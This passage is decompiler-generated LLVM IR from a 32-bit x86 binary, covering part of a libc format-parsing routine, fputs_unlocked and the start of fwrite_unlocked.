  %v3_8052655 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8052655, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052659

dec_label_pc_8052659:                             ; preds = %dec_label_pc_80526a8, %dec_label_pc_8052650
  %v0_80526a8 = phi i32 [ %v1_80526a8, %dec_label_pc_80526a8 ], [ ptrtoint ([21 x i8]* @global_var_805d055.932 to i32), %dec_label_pc_8052650 ]
  %v3_8052659 = inttoptr i32 %v0_80526a8 to i8*
  %v4_8052659 = load i8, i8* %v3_8052659, align 1
  %v15_8052659 = icmp eq i8 %v2_8052646, %v4_8052659
  %v1_805265b = icmp eq i1 %v15_8052659, false
  br i1 %v1_805265b, label %dec_label_pc_80526a8, label %dec_label_pc_805265d

dec_label_pc_805265d:                             ; preds = %dec_label_pc_8052659
  %v1_805265f = add i32 %v0_80526a8, -134598741
  store i32 %v1_805265f, i32* %edx.global-to-local, align 4
  %v7_8052668 = icmp sgt i32 %v1_805265f, 17
  br i1 %v7_8052668, label %dec_label_pc_805266a, label %dec_label_pc_8052672

dec_label_pc_805266a:                             ; preds = %dec_label_pc_805265d
  %v3_805266a = and i32 %v2_8052643, 1024
  %v4_805266a = icmp eq i32 %v3_805266a, 0
  br i1 %v4_805266a, label %dec_label_pc_8052672, label %dec_label_pc_805266f

dec_label_pc_805266f:                             ; preds = %dec_label_pc_805266a
  %v1_805266f = add i32 %v0_80526a8, -134598743
  store i32 %v1_805266f, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052672

dec_label_pc_8052672:                             ; preds = %dec_label_pc_805265d, %dec_label_pc_805266a, %dec_label_pc_805266f
  %v0_805267b = phi i32 [ %v1_805265f, %dec_label_pc_805265d ], [ %v1_805265f, %dec_label_pc_805266a ], [ %v1_805266f, %dec_label_pc_805266f ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805d04b.933 to i32), i32* %ecx.global-to-local, align 4
  %v2_805267b = add i32 %tmp76, 32
  %v3_805267b = inttoptr i32 %v2_805267b to i32*
  store i32 %v0_805267b, i32* %v3_805267b, align 4
  %v0_805267e.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_8052682.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805267e

dec_label_pc_805267e:                             ; preds = %dec_label_pc_805267e, %dec_label_pc_8052672
  %v0_805267e = phi i32 [ %v1_805267e, %dec_label_pc_805267e ], [ %v0_805267e.pre, %dec_label_pc_8052672 ]
  %v1_805267e = add i32 %v0_805267e, 1
  store i32 %v1_805267e, i32* %ecx.global-to-local, align 4
  %v1_805267f = inttoptr i32 %v1_805267e to i8*
  %v2_805267f = load i8, i8* %v1_805267f, align 1
  %v3_805267f = sext i8 %v2_805267f to i32
  store i32 %v3_805267f, i32* %eax.global-to-local, align 4
  %v8_8052684 = icmp sgt i32 %v0_8052682.pre, %v3_805267f
  br i1 %v8_8052684, label %dec_label_pc_805267e, label %dec_label_pc_8052686

dec_label_pc_8052686:                             ; preds = %dec_label_pc_805267e
  store i32 ptrtoint ([21 x i8]* @global_var_805d055.932 to i32), i32* @ecx, align 4
  %v1_805268d = add i32 %v0_805267e, -134598731
  store i32 %v1_805268d, i32* %eax.global-to-local, align 4
  %v2_8052692 = add i32 %v0_805267e, add (i32 ptrtoint (i32* @global_var_805d03c.934 to i32), i32 -134598731)
  %v3_8052692 = add i32 %v2_8052692, %v1_805268d
  %v4_8052692 = inttoptr i32 %v3_8052692 to i16*
  %v5_8052692 = load i16, i16* %v4_8052692, align 2
  %v6_8052692 = sext i16 %v5_8052692 to i32
  store i32 %v6_8052692, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_805268d, 2
  %v3_805269a = add i32 %factor, 134598700
  %v4_805269a = inttoptr i32 %v3_805269a to i16*
  %v5_805269a = load i16, i16* %v4_805269a, align 2
  %v6_805269a = sext i16 %v5_805269a to i32
  store i32 %v6_805269a, i32* %eax.global-to-local, align 4
  %v1_80526a2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80526a2 = or i32 %v1_80526a2, %v6_8052692
  %v2_80526a4 = and i32 %v2_80526a2, %v6_805269a
  store i32 %v2_80526a4, i32* %edx.global-to-local, align 4
  %v0_80526b6.pre = load i32, i32* @esi, align 4
  %v0_80526b9.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80526ae

dec_label_pc_80526a8:                             ; preds = %dec_label_pc_8052659
  %v1_80526a8 = add i32 %v0_80526a8, 1
  store i32 %v1_80526a8, i32* @ecx, align 4
  %v1_80526a9 = inttoptr i32 %v1_80526a8 to i8*
  %v2_80526a9 = load i8, i8* %v1_80526a9, align 1
  %v3_80526a9 = icmp eq i8 %v2_80526a9, 0
  %v1_80526ac = icmp eq i1 %v3_80526a9, false
  br i1 %v1_80526ac, label %dec_label_pc_8052659, label %dec_label_pc_80526ae

dec_label_pc_80526ae:                             ; preds = %dec_label_pc_80526a8, %dec_label_pc_8052686
  %v0_80526b9 = phi i32 [ %v0_80526b9.pre, %dec_label_pc_8052686 ], [ %storemerge4, %dec_label_pc_80526a8 ]
  %v0_80526b6 = phi i32 [ %v0_80526b6.pre, %dec_label_pc_8052686 ], [ %v0_8052646, %dec_label_pc_80526a8 ]
  %v0_80526ae = phi i32 [ %v2_80526a4, %dec_label_pc_8052686 ], [ %v3_8052655, %dec_label_pc_80526a8 ]
  store i32 %v0_80526ae, i32* %stack_var_-20, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_80526b6 = inttoptr i32 %v0_80526b6 to i8*
  %v2_80526b6 = load i8, i8* %v1_80526b6, align 1
  %v3_80526b6 = sext i8 %v2_80526b6 to i32
  store i32 %v3_80526b6, i32* %eax.global-to-local, align 4
  %v2_80526b9 = add i32 %tmp76, 4
  %v3_80526b9 = inttoptr i32 %v2_80526b9 to i32*
  store i32 %v0_80526b9, i32* %v3_80526b9, align 4
  %v0_80526bc = load i32, i32* %eax.global-to-local, align 4
  %v1_80526bc = load i32, i32* @edx, align 4
  %v2_80526bc = add i32 %v1_80526bc, 12
  %v3_80526bc = inttoptr i32 %v2_80526bc to i32*
  store i32 %v0_80526bc, i32* %v3_80526bc, align 4
  store i32 %stack_var_-96.2, i32* %eax.global-to-local, align 4
  %v0_80526c3 = load i32, i32* @edx, align 4
  %v1_80526c3 = add i32 %v0_80526c3, 28
  %v2_80526c3 = inttoptr i32 %v1_80526c3 to i32*
  store i32 1, i32* %v2_80526c3, align 4
  %v0_80526ca = load i32, i32* %eax.global-to-local, align 4
  %v1_80526ca = load i32, i32* @edx, align 4
  %v2_80526ca = add i32 %v1_80526ca, 8
  %v3_80526ca = inttoptr i32 %v2_80526ca to i32*
  store i32 %v0_80526ca, i32* %v3_80526ca, align 4
  %v0_80526cd = load i32, i32* %edi.global-to-local, align 4
  %v1_80526d7 = and i32 %v0_80526cd, -5
  %v0_80526dd = load i32, i32* %ebx.global-to-local, align 4
  %v1_80526dd = and i32 %v0_80526dd, 3840
  store i32 %v1_80526dd, i32* %ebx.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_80526e6 = or i32 %v1_80526dd, %v1_80526d7
  store i32 %v2_80526e6, i32* @edi, align 4
  %v1_80526e8 = load i32, i32* @edx, align 4
  %v2_80526e8 = add i32 %v1_80526e8, 20
  %v3_80526e8 = inttoptr i32 %v2_80526e8 to i32*
  store i32 48, i32* %v3_80526e8, align 4
  %v0_80526eb = load i32, i32* @edi, align 4
  %v1_80526eb = load i32, i32* @edx, align 4
  %v2_80526eb = add i32 %v1_80526eb, 16
  %v3_80526eb = inttoptr i32 %v2_80526eb to i32*
  store i32 %v0_80526eb, i32* %v3_80526eb, align 4
  %v0_80526ee = load i32, i32* @ecx, align 4
  %v1_80526ee = inttoptr i32 %v0_80526ee to i8*
  %v2_80526ee = load i8, i8* %v1_80526ee, align 1
  %v3_80526ee = icmp eq i8 %v2_80526ee, 0
  %v1_80526f1 = icmp eq i1 %v3_80526ee, false
  br i1 %v1_80526f1, label %dec_label_pc_805270a, label %dec_label_pc_80526f3

dec_label_pc_80526f3:                             ; preds = %dec_label_pc_80526ae
  %v0_80526f3 = load i32, i32* @esi, align 4
  %v1_80526f3 = inttoptr i32 %v0_80526f3 to i8*
  %v2_80526f3 = load i8, i8* %v1_80526f3, align 1
  %v11_80526f3 = icmp eq i8 %v2_80526f3, 109
  %v1_80526f6 = icmp eq i1 %v11_80526f3, false
  br i1 %v1_80526f6, label %dec_label_pc_80527fc, label %dec_label_pc_80526fc

dec_label_pc_80526fc:                             ; preds = %dec_label_pc_80526f3
  %v0_80526fc = load i32, i32* @edx, align 4
  %v1_80526fc = add i32 %v0_80526fc, 32
  %v2_80526fc = inttoptr i32 %v1_80526fc to i32*
  store i32 20, i32* %v2_80526fc, align 4
  %v0_8052703 = load i32, i32* @edx, align 4
  %v1_8052703 = add i32 %v0_8052703, 28
  %v2_8052703 = inttoptr i32 %v1_8052703 to i32*
  store i32 0, i32* %v2_8052703, align 4
  br label %dec_label_pc_805270a

dec_label_pc_805270a:                             ; preds = %dec_label_pc_80526ae, %dec_label_pc_80526fc
  %tmp92 = icmp slt i32 %stack_var_-88.3, 1
  br i1 %tmp92, label %dec_label_pc_805279e, label %dec_label_pc_8052715

dec_label_pc_8052715:                             ; preds = %dec_label_pc_805270a
  store i32 0, i32* %ebp.global-to-local, align 4
  %v3_8052756 = add i32 %tmp76, 40
  %v1_805278f = add i32 %tmp76, 28
  %v2_805278f = inttoptr i32 %v1_805278f to i32*
  %v4_8052724 = add i32 %tmp76, 36
  br label %dec_label_pc_8052717

dec_label_pc_8052717:                             ; preds = %dec_label_pc_805278a, %dec_label_pc_8052715
  %v0_805272d = phi i32 [ 0, %dec_label_pc_8052715 ], [ %v1_805278e, %dec_label_pc_805278a ]
  %stack_var_-88.4 = phi i32 [ %stack_var_-88.3, %dec_label_pc_8052715 ], [ %stack_var_-88.5, %dec_label_pc_805278a ]
  %v1_8052717 = add i32 %v0_805272d, -2
  %v6_8052717 = sub i32 1, %v0_805272d
  %v7_8052717 = and i32 %v6_8052717, %v0_805272d
  %v8_8052717 = icmp slt i32 %v7_8052717, 0
  %v9_8052717 = icmp eq i32 %v1_8052717, 0
  %v10_8052717 = icmp slt i32 %v1_8052717, 0
  %v3_805271a = icmp eq i1 %v10_8052717, %v8_8052717
  %v4_805271a = icmp eq i1 %v9_8052717, false
  %v5_805271a = and i1 %v4_805271a, %v3_805271a
  br i1 %v5_805271a, label %dec_label_pc_805272d, label %dec_label_pc_805271c

dec_label_pc_805271c:                             ; preds = %dec_label_pc_8052717
  store i32 %tmp76, i32* @edx, align 4
  %v0_8052720 = load i32, i32* @esp, align 4
  %v2_8052720 = mul i32 %v0_805272d, 4
  %v3_8052720 = add i32 %v2_8052720, 68
  %v4_8052720 = add i32 %v3_8052720, %v0_8052720
  %v5_8052720 = inttoptr i32 %v4_8052720 to i32*
  %v6_8052720 = load i32, i32* %v5_8052720, align 4
  store i32 %v6_8052720, i32* %eax.global-to-local, align 4
  %v1_8052724 = trunc i32 %v6_8052720 to i8
  %v5_8052724 = add i32 %v4_8052724, %v0_805272d
  %v6_8052724 = inttoptr i32 %v5_8052724 to i8*
  store i8 %v1_8052724, i8* %v6_8052724, align 1
  %v0_8052728 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052728 = urem i32 %v0_8052728, 256
  br label %dec_label_pc_8052736

dec_label_pc_805272d:                             ; preds = %dec_label_pc_8052717
  %v5_805272f = add i32 %v0_805272d, %stack_var_-32.3
  store i32 %v5_805272f, i32* %eax.global-to-local, align 4
  %v1_8052733 = add i32 %v5_805272f, -2
  br label %dec_label_pc_8052736

dec_label_pc_8052736:                             ; preds = %dec_label_pc_805271c, %dec_label_pc_805272d
  %v0_8052749 = phi i32 [ %v1_8052728, %dec_label_pc_805271c ], [ %v1_8052733, %dec_label_pc_805272d ]
  store i32 %v0_8052749, i32* %eax.global-to-local, align 4
  %v5_8052736 = sub i32 %v0_8052749, %stack_var_-88.4
  %v11_8052736 = xor i32 %v0_8052749, %stack_var_-88.4
  %v12_8052736 = xor i32 %v5_8052736, %v0_8052749
  %v13_8052736 = and i32 %v12_8052736, %v11_8052736
  %v14_8052736 = icmp slt i32 %v13_8052736, 0
  %v15_8052736 = icmp eq i32 %v5_8052736, 0
  %v16_8052736 = icmp slt i32 %v5_8052736, 0
  %v3_805273a = icmp ne i1 %v16_8052736, %v14_8052736
  %v4_805273a = or i1 %v15_8052736, %v3_805273a
  br i1 %v4_805273a, label %dec_label_pc_8052749, label %dec_label_pc_805273c

dec_label_pc_805273c:                             ; preds = %dec_label_pc_8052736
  %v1_805273c = add i32 %v0_8052749, -9
  %v6_805273c = sub i32 8, %v0_8052749
  %v7_805273c = and i32 %v6_805273c, %v0_8052749
  %v8_805273c = icmp slt i32 %v7_805273c, 0
  %v9_805273c = icmp eq i32 %v1_805273c, 0
  %v10_805273c = icmp slt i32 %v1_805273c, 0
  %v3_805273f = icmp eq i1 %v10_805273c, %v8_805273c
  %v4_805273f = icmp eq i1 %v9_805273c, false
  %v5_805273f = and i1 %v4_805273f, %v3_805273f
  br i1 %v5_805273f, label %dec_label_pc_80527fc, label %dec_label_pc_8052749

dec_label_pc_8052749:                             ; preds = %dec_label_pc_805273c, %dec_label_pc_8052736
  %stack_var_-88.5 = phi i32 [ %stack_var_-88.4, %dec_label_pc_8052736 ], [ %v0_8052749, %dec_label_pc_805273c ]
  %v1_8052749 = add i32 %v0_8052749, -1
  store i32 %v1_8052749, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v0_8052752 = load i32, i32* @esp, align 4
  %v1_8052752 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8052752 = mul i32 %v1_8052752, 4
  %v3_8052752 = add i32 %v0_8052752, 80
  %v4_8052752 = add i32 %v3_8052752, %v2_8052752
  %v5_8052752 = inttoptr i32 %v4_8052752 to i32*
  %v6_8052752 = load i32, i32* %v5_8052752, align 4
  store i32 %v6_8052752, i32* %edi.global-to-local, align 4
  %v2_8052756 = mul i32 %v1_8052749, 4
  %v4_8052756 = add i32 %v3_8052756, %v2_8052756
  %v5_8052756 = inttoptr i32 %v4_8052756 to i32*
  %v6_8052756 = load i32, i32* %v5_8052756, align 4
  store i32 %v6_8052756, i32* @eax, align 4
  %v9_805275a = icmp eq i32 %v6_8052752, 8
  br i1 %v9_805275a, label %dec_label_pc_805278a, label %dec_label_pc_805275f

dec_label_pc_805275f:                             ; preds = %dec_label_pc_8052749
  %v9_805275f = icmp eq i32 %v6_8052756, 8
  br i1 %v9_805275f, label %dec_label_pc_805277a, label %dec_label_pc_8052764

dec_label_pc_8052764:                             ; preds = %dec_label_pc_805275f
  %v12_8052764 = icmp eq i32 %v6_8052756, %v6_8052752
  br i1 %v12_8052764, label %dec_label_pc_805277a, label %dec_label_pc_8052768

dec_label_pc_8052768:                             ; preds = %dec_label_pc_8052764
  %v1_8052768 = call i32 @_promoted_size(i32 %v1_8052749)
  store i32 %v1_8052768, i32* %ebx.global-to-local, align 4
  %v0_805276f = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_805276f, i32* @eax, align 4
  %v1_8052771 = call i32 @_promoted_size(i32 %v1_8052749)
  store i32 %v1_8052771, i32* %eax.global-to-local, align 4
  %v8_8052778 = icmp sgt i32 %v1_8052768, %v1_8052771
  br i1 %v8_8052778, label %dec_label_pc_805278a, label %dec_label_pc_8052768.dec_label_pc_805277a_crit_edge

dec_label_pc_8052768.dec_label_pc_805277a_crit_edge: ; preds = %dec_label_pc_8052768
  %v0_8052782.pre = load i32, i32* @esp, align 4
  %v1_8052782.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805277a

dec_label_pc_805277a:                             ; preds = %dec_label_pc_8052768.dec_label_pc_805277a_crit_edge, %dec_label_pc_8052764, %dec_label_pc_805275f
  %v1_8052782 = phi i32 [ %v1_8052782.pre, %dec_label_pc_8052768.dec_label_pc_805277a_crit_edge ], [ %v1_8052752, %dec_label_pc_8052764 ], [ %v1_8052752, %dec_label_pc_805275f ]
  %v0_8052782 = phi i32 [ %v0_8052782.pre, %dec_label_pc_8052768.dec_label_pc_805277a_crit_edge ], [ %v0_8052752, %dec_label_pc_8052764 ], [ %v0_8052752, %dec_label_pc_805275f ]
  store i32 %v1_8052749, i32* %ecx.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v2_8052782 = mul i32 %v1_8052782, 4
  %v3_8052782 = add i32 %v0_8052782, 80
  %v4_8052782 = add i32 %v3_8052782, %v2_8052782
  %v5_8052782 = inttoptr i32 %v4_8052782 to i32*
  %v6_8052782 = load i32, i32* %v5_8052782, align 4
  store i32 %v6_8052782, i32* %eax.global-to-local, align 4
  store i32 %v6_8052782, i32* %v5_8052756, align 4
  br label %dec_label_pc_805278a

dec_label_pc_805278a:                             ; preds = %dec_label_pc_8052768, %dec_label_pc_8052749, %dec_label_pc_805277a
  store i32 %tmp76, i32* @ecx, align 4
  %v0_805278e = load i32, i32* %ebp.global-to-local, align 4
  %v1_805278e = add i32 %v0_805278e, 1
  store i32 %v1_805278e, i32* %ebp.global-to-local, align 4
  %v3_805278f = load i32, i32* %v2_805278f, align 4
  %v1_8052792 = add i32 %v3_805278f, 2
  store i32 %v1_8052792, i32* %eax.global-to-local, align 4
  %v5_8052797 = icmp slt i32 %v1_805278e, %v1_8052792
  br i1 %v5_8052797, label %dec_label_pc_8052717, label %dec_label_pc_80527c5

dec_label_pc_805279e:                             ; preds = %dec_label_pc_805270a
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_80527a2 = add i32 %tmp76, 38
  %v2_80527a2 = inttoptr i32 %v1_80527a2 to i8*
  store i8 1, i8* %v2_80527a2, align 1
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_80527ab = add i32 %tmp76, 28
  %v2_80527ab = inttoptr i32 %v1_80527ab to i32*
  %v3_80527ab = load i32, i32* %v2_80527ab, align 4
  %v2_80527ae = mul i32 %v3_80527ab, 4
  %v2_80527b2 = ptrtoint i32* %stack_var_-20 to i32
  %v1_80527b9 = add i32 %tmp76, 40
  store i32 %v1_80527b9, i32* %eax.global-to-local, align 4
  %v3_80527bd = inttoptr i32 %v1_80527b9 to i16*
  %v4_80527bd = call i32 @memcpy(i16* %v3_80527bd, i32 %v2_80527b2, i32 %v2_80527ae)
  store i32 %v4_80527bd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80527c5

dec_label_pc_80527c5:                             ; preds = %dec_label_pc_805278a, %dec_label_pc_805279e
  %stack_var_-88.6 = phi i32 [ %stack_var_-88.3, %dec_label_pc_805279e ], [ %stack_var_-88.5, %dec_label_pc_805278a ]
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %stack_var_-88.6, i32* %eax.global-to-local, align 4
  store i32 %stack_var_-88.6, i32* %v2_8052470, align 4
  %v0_80527d0 = load i32, i32* @ecx, align 4
  %v1_80527d0 = add i32 %v0_80527d0, 16
  %v2_80527d0 = inttoptr i32 %v1_80527d0 to i8*
  %v3_80527d0 = load i8, i8* %v2_80527d0, align 1
  %v5_80527d0 = icmp slt i8 %v3_80527d0, 0
  br i1 %v5_80527d0, label %dec_label_pc_80527dd, label %dec_label_pc_80527d6

dec_label_pc_80527d6:                             ; preds = %dec_label_pc_80527c5
  %v0_80527d6 = load i32, i32* @esi, align 4
  %v1_80527d6 = add i32 %v0_80527d6, 1
  store i32 %v1_80527d6, i32* %eax.global-to-local, align 4
  %v2_80527d9 = inttoptr i32 %v0_80527d0 to i32*
  store i32 %v1_80527d6, i32* %v2_80527d9, align 4
  br label %dec_label_pc_80527f0

dec_label_pc_80527dd:                             ; preds = %dec_label_pc_80527c5
  store i32 %v4_8052444, i32* %edx.global-to-local, align 4
  store i32 %tmp76, i32* @ecx, align 4
  %v0_80527e5 = load i32, i32* @esi, align 4
  %v2_80527e5 = sub i32 %v0_80527e5, %v4_8052444
  store i32 %v2_80527e5, i32* %esi.global-to-local, align 4
  %v1_80527e7 = mul i32 %v2_80527e5, 4
  %v2_80527e7 = add i32 %v1_80527e7, 224
  store i32 %v2_80527e7, i32* %eax.global-to-local, align 4
  %v2_80527ee = load i32, i32* %arg1, align 4
  %v4_80527ee = add i32 %v2_80527ee, %v2_80527e7
  store i32 %v4_80527ee, i32* %arg1, align 4
  br label %dec_label_pc_80527f0

dec_label_pc_80527f0:                             ; preds = %dec_label_pc_80527d6, %dec_label_pc_80527dd
  store i32 %tmp76, i32* @edx, align 4
  %v1_80527f4 = add i32 %tmp76, 28
  %v2_80527f4 = inttoptr i32 %v1_80527f4 to i32*
  %v3_80527f4 = load i32, i32* %v2_80527f4, align 4
  store i32 %v3_80527f4, i32* %eax.global-to-local, align 4
  %v1_80527f7 = add i32 %v3_80527f4, 2
  br label %dec_label_pc_80527ff

dec_label_pc_80527fc:                             ; preds = %dec_label_pc_8052495, %dec_label_pc_805252f, %dec_label_pc_8052562, %dec_label_pc_80525dd, %dec_label_pc_80525c9, %dec_label_pc_80525c0, %dec_label_pc_805273c, %dec_label_pc_80526f3, %dec_label_pc_805263f
  br label %dec_label_pc_80527ff

dec_label_pc_80527ff:                             ; preds = %dec_label_pc_80527f0, %dec_label_pc_80527fc
  %storemerge6 = phi i32 [ %v1_80527f7, %dec_label_pc_80527f0 ], [ -1, %dec_label_pc_80527fc ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_8052802 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8052802, i32* @ebx, align 4
  store i32 %v0_8052443, i32* @esi, align 4
  store i32 %v0_8052442, i32* @edi, align 4
  ret i32 %storemerge6

; uselistorder directives
  uselistorder i32 %stack_var_-88.6, { 1, 0 }
  uselistorder i32 %v1_805278e, { 0, 2, 1 }
  uselistorder i32 %v1_8052749, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_805273c, { 1, 0 }
  uselistorder i32 %v5_8052736, { 1, 2, 0 }
  uselistorder i32 %v0_8052749, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_8052717, { 1, 0 }
  uselistorder i32 %stack_var_-88.4, { 1, 0, 2 }
  uselistorder i32 %v0_805272d, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %v1_80526a8, { 1, 2, 0 }
  uselistorder i32 %v1_805267e, { 1, 2, 0 }
  uselistorder i32 %v0_80526a8, { 2, 0, 1, 3 }
  uselistorder i32 %v2_8052643, { 1, 0 }
  uselistorder i32 %v1_8052632, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_805263b, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_8052625, { 0, 2, 3, 1 }
  uselistorder i32 %v6_805261b, { 1, 0 }
  uselistorder i32 %v1_80525fd, { 1, 0 }
  uselistorder i32 %v0_805261b.pre.pre, { 0, 3, 1, 2 }
  uselistorder i32 %stack_var_-88.3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %stack_var_-32.3, { 1, 0 }
  uselistorder i32 %v1_80525e0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_80525d7, { 1, 2, 0 }
  uselistorder i32 %v0_805259d, { 1, 0 }
  uselistorder i32 %v1_805258f, { 1, 0 }
  uselistorder i32 %v1_805258a, { 0, 1, 3, 2 }
  uselistorder i32 %v6_8052588, { 2, 0, 1 }
  uselistorder i32 %v0_80525aa, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_8052545, { 1, 2, 0 }
  uselistorder i32 %v0_805251d, { 0, 1, 2, 6, 3, 4, 5, 7 }
  uselistorder i32 %v0_8052510.lcssa, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_8052509.lcssa, { 0, 1, 2, 3, 5, 8, 7, 4, 6 }
  uselistorder i32 %v2_8052513, { 1, 2, 0 }
  uselistorder i32 %v6_8052511, { 0, 2, 1 }
  uselistorder i32 %v1_8052510, { 0, 2, 3, 1 }
  uselistorder i32 %v3_8052509, { 2, 1, 0 }
  uselistorder i32 %v1_8052501, { 1, 0 }
  uselistorder i32 %v1_8052509137, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v0_80524f9, { 1, 0, 2 }
  uselistorder i32 %stack_var_-88.1, { 0, 1, 3, 4, 2, 6, 5, 7 }
  uselistorder i32 %v0_80524ec, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v8_80524e7, { 1, 0, 3, 2 }
  uselistorder i32 %v1_80524bd, { 0, 2, 1 }
  uselistorder i32 %v2_80524ac, { 1, 0 }
  uselistorder i32 %v0_80524aa, { 2, 0, 1 }
  uselistorder i32 %v4_8052444, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 %tmp76, { 24, 23, 22, 21, 1, 20, 19, 18, 17, 16, 15, 14, 13, 0, 2, 3, 4, 12, 11, 10, 9, 8, 7, 6, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 3, 4, 6, 5, 7, 8, 9, 2 }
  uselistorder i32* %edi.global-to-local, { 0, 1, 3, 4, 5, 7, 6, 2 }
  uselistorder i32* %ebp.global-to-local, { 2, 4, 3, 5, 6, 0, 1, 7 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 18, 12, 13, 14, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 37, 33, 32, 34, 35, 38, 36, 17, 40, 39, 41, 42, 43, 44, 15, 16 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 -5, { 3, 0, 1, 2 }
  uselistorder i32 -134598731, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_805d055.932 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_80527ff, { 1, 0 }
  uselistorder label %dec_label_pc_80527fc, { 6, 7, 8, 3, 4, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_80527f0, { 1, 0 }
  uselistorder label %dec_label_pc_80527c5, { 1, 0 }
  uselistorder label %dec_label_pc_805278a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052736, { 1, 0 }
  uselistorder label %dec_label_pc_805270a, { 1, 0 }
  uselistorder label %dec_label_pc_8052672, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805263f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052616, { 1, 0 }
  uselistorder label %dec_label_pc_80525ed, { 1, 0 }
  uselistorder label %dec_label_pc_80525b4, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8052557, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052510, { 1, 0 }
  uselistorder label %dec_label_pc_8052501, { 1, 0 }
  uselistorder label %dec_label_pc_80524f7, { 1, 0 }
  uselistorder label %dec_label_pc_80524e0, { 1, 0 }
  uselistorder label %dec_label_pc_80524e0.outer, { 2, 0, 1 }
}

define i32 @__GI_fputs_unlocked() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-8 = alloca i32, align 4
  %v0_8052808 = load i32, i32* @esi, align 4
  %v0_8052809 = load i32, i32* @ebx, align 4
  store i32 %v0_8052809, i32* %stack_var_-8, align 4
  %v4_805280d = ptrtoint i8* %tmp4 to i32
  store i32 %v4_805280d, i32* @ebx, align 4
  %v3_8052812 = call i32 @strlen(i8* %tmp4)
  store i32 %v3_8052812, i32* @esi, align 4
  %v0_8052823 = load i32, i32* @ebx, align 4
  %v6_8052824 = call i32 @__GI_fwrite_unlocked(i32 %v0_8052823, i64 1, i32 %v3_8052812, i32 %tmp)
  %v1_805282f = load i32, i32* @esi, align 4
  %v12_805282f = icmp eq i32 %v6_8052824, %v1_805282f
  %v1_8052831 = icmp eq i1 %v12_805282f, false
  br i1 %v1_8052831, label %dec_label_pc_8052835, label %dec_label_pc_8052833

dec_label_pc_8052833:                             ; preds = %entry
  br label %dec_label_pc_8052835

dec_label_pc_8052835:                             ; preds = %entry, %dec_label_pc_8052833
  %v0_8052835 = phi i32 [ -1, %entry ], [ %v6_8052824, %dec_label_pc_8052833 ]
  %v2_8052838 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052838, i32* @ebx, align 4
  store i32 %v0_8052808, i32* @esi, align 4
  ret i32 %v0_8052835

; uselistorder directives
  uselistorder i32 %v6_8052824, { 1, 0 }
  uselistorder i8* %tmp4, { 1, 0 }
  uselistorder label %dec_label_pc_8052835, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_805283c = load i32, i32* @edi, align 4
  %v0_805283d = load i32, i32* @esi, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v4_8052843 = trunc i64 %arg2 to i32
  store i32 %v4_8052843, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_805284b = inttoptr i32 %arg4 to i16*
  %v2_805284b = load i16, i16* %v1_805284b, align 2
  %v1_805284e = and i16 %v2_805284b, 192
  %v6_8052853 = icmp eq i16 %v1_805284e, 192
  br i1 %v6_8052853, label %dec_label_pc_805286e, label %dec_label_pc_805285a

dec_label_pc_805285a:                             ; preds = %entry
  %v0_805285a = load i32, i32* @edx, align 4
  store i32 %arg4, i32* %stack_var_-28, align 4
